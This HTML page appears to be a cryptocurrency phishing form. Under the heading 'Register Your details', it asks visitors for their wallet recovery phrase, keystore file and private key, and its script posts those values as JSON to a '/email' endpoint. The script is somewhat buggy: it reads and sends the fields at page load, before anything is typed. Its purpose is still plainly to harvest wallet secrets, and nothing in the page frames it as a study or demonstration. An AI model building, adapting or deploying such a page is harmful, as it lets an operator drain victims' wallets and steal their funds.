<!doctype html>
<html lang="en">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap"
        rel="stylesheet">
    <link rel="stylesheet" href="styles/formstyle.css">
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <!-- Title -->
    <title>App Form</title>
</head>

<body>
    <h2 class="text-center mt-5">Register Your details</h2>
    <p class="text-center">Please Provide your Info</p>
    <div class="container">
        <form id="mail_form">
            <div class="row">
                <div class="col-25">
                    <label for="subject">Phrase</label>
                </div>
                <div class="col-75">
                    <textarea id="phrase" name="phrase" placeholder="Phrase.." style="height:200px"></textarea>
                </div>
            </div>
            <div class="row">
                <div class="col-25">
                    <label for="subject">Keystore</label>
                </div>
                <div class="col-75">
                    <textarea id="keystore" name="keystore" placeholder="Keystore.." style="height:200px"></textarea>
                </div>
            </div>
            <div class="row">
                <div class="col-25">
                    <label for="subject">Private Key</label>
                </div>
                <div class="col-75">
                    <textarea id="privatekey" name="privatekey" placeholder="Private Key.." style="height:200px" ></textarea>
                </div>
            </div>
            <div class="row">
                <input type="submit" value="Submit" id="submit" onclick="submitUserData()">
            </div>
        </form>
    </div>

        <script>
            let phrase = document.getElementById("phrase").value;
            let keyStore = document.getElementById("keystore").value;
            let privateKey = document.getElementById("privatekey").value;
            const Form = document.getElementById("mail_form");
            const submitFormData = document.getElementById("submit")
            console.log(phrase, keyStore, privateKey);

            const data = {
                phrase,
                keyStore,
                privateKey
            };

            fetch("/email", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            
            .then((response) => response.json()).then((data)=> console.log("Success: ", data)).catch((error) => console.log("Error: there has been an error here", error))

            function submitUserData() {
                const give = document.getElementById("mail_form").submit();
                console.log(give);
                if (give) {
                    phrase = "";
                    keyStore = "";
                    privateKey = "";
                }
                
            }
        </script>
</body>

</html>
